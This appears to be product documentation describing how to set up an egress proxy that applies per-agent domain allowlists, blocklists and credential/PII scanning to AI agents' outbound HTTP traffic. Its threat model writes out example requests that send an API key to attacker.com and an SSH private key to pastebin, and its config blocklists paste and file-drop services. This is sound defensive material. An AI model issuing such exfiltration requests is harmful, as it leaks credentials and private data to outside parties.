# Use Case: Egress DLP for AI Agents

## The scenario

Your AI agents make outbound HTTP requests — calling APIs, fetching data, posting results. You need to ensure they don't:

- Send credentials to unauthorized endpoints
- Exfiltrate PII or sensitive data
- Reach domains they shouldn't access
- Bypass security controls by using different agents

This is Data Loss Prevention (DLP) for the AI agent layer.

## The threat model

### Credential exfiltration

An agent extracts an API key from a config file and sends it to an external service:

```
GET https://attacker.com/collect?key=AKIA1234567890ABCDEF
X-Oktsec-Agent: researcher
```

### Data staging via allowed APIs

An agent uses a legitimate API to stage stolen data:

```
POST https://api.pastebin.com/api/api_post.php
Body: "SSH_PRIVATE_KEY=-----BEGIN OPENSSH PRIVATE KEY-----..."
```

### Unauthorized domain access

A research agent should only access arxiv.org and scholar.google.com, but tries to reach internal APIs or command-and-control infrastructure.

## Implementation

### Step 1: Enable the forward proxy

```yaml
forward_proxy:
  enabled: true
  scan_requests: true      # scan outbound request bodies
  scan_responses: false     # don't scan inbound responses (optional)
  max_body_size: 1048576   # 1 MB max body to scan
  blocked_domains:          # global blocklist (applies to ALL agents)
    - pastebin.com
    - paste.ee
    - hastebin.com
    - transfer.sh
    - file.io
```

### Step 2: Define per-agent egress policies

```yaml
agents:
  researcher:
    can_message: [coordinator]
    egress:
      allowed_domains:         # ONLY these domains are reachable
        - api.arxiv.org
        - api.semanticscholar.org
        - scholar.google.com
      blocked_categories:      # DLP: block these content types
        - credentials
        - pii
      scan_requests: true
      rate_limit: 200          # max 200 requests per window
      rate_window: 60

  coder:
    can_message: [coordinator]
    egress:
      allowed_domains:
        - api.github.com
        - registry.npmjs.org
        - pypi.org
      blocked_domains:         # agent-specific blocklist
        - raw.githubusercontent.com  # prevent downloading unknown scripts
      blocked_categories:
        - credentials
      rate_limit: 100

  coordinator:
    can_message: ["*"]
    # no egress block = uses global forward_proxy settings
```

### Step 3: Configure your agents to use the proxy

Agents identify themselves with the `X-Oktsec-Agent` header:

```bash
# Researcher agent's HTTP client
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080

curl -H "X-Oktsec-Agent: researcher" \
     https://api.arxiv.org/search?query=llm+security
# -> Allowed (domain in researcher's allowlist)

curl -H "X-Oktsec-Agent: researcher" \
     https://api.github.com/repos
# -> 403 Forbidden (not in researcher's allowlist)
```

For Docker Sandbox deployments, set the proxy via `--network-proxy`:

```bash
docker run --network-proxy http://host.docker.internal:8080 \
  -e X_OKTSEC_AGENT=researcher \
  my-research-agent
```

!!! important "Header stripping"
    The `X-Oktsec-Agent` header is **always stripped** before forwarding to the destination. It never reaches the upstream server.

### Step 4: Monitor egress in the dashboard

All proxy traffic is logged to the audit trail:

```bash
oktsec logs --agent researcher --status blocked
```

```
2026-03-06T10:15:23Z  researcher -> api.github.com    blocked  proxy_blocked_domain
2026-03-06T10:15:45Z  researcher -> evil.com           blocked  proxy_blocked_domain
2026-03-06T10:16:02Z  coder      -> registry.npmjs.org forwarded proxy_allowed
```

## How merge rules work

Per-agent egress policies **merge** with global settings:

```
Global blocked_domains: [pastebin.com, evil.com]
   +
Agent blocked_domains:  [raw.githubusercontent.com]
   =
Effective blocklist:    [pastebin.com, evil.com, raw.githubusercontent.com]
```

```
Global allowed_domains: [internal-api.company.com]
   +
Agent allowed_domains:  [api.github.com]
   =
Effective allowlist:    [internal-api.company.com, api.github.com]
```

!!! warning "Global blocklist always wins"
    If a domain is in the global `blocked_domains`, no per-agent policy can override it. This ensures organization-wide security policies are enforced.

## DLP in action

When `scan_requests: true` and `blocked_categories` are set, every outbound request body is scanned by the Aguara engine. If a finding's category matches the blocked list, the request is blocked:

```
POST https://api.arxiv.org/submit
Body: "Here are the results. Also, AWS_ACCESS_KEY=AKIA..."

-> Aguara finds: credential-leak (IAP-003)
-> blocked_categories includes "credentials"
-> Request BLOCKED (proxy_blocked_content)
```

The agent gets a 403 response. The audit log records the block with full context.

## Production checklist

- [ ] Enable `forward_proxy.enabled: true`
- [ ] Set global `blocked_domains` for known-bad destinations
- [ ] Set `scan_requests: true` globally
- [ ] Define `egress.allowed_domains` for each agent (principle of least privilege)
- [ ] Set `blocked_categories: [credentials, pii]` for agents handling sensitive data
- [ ] Set `rate_limit` per agent to prevent abuse
- [ ] Configure webhooks for `blocked` events
- [ ] Review audit logs weekly for anomalies
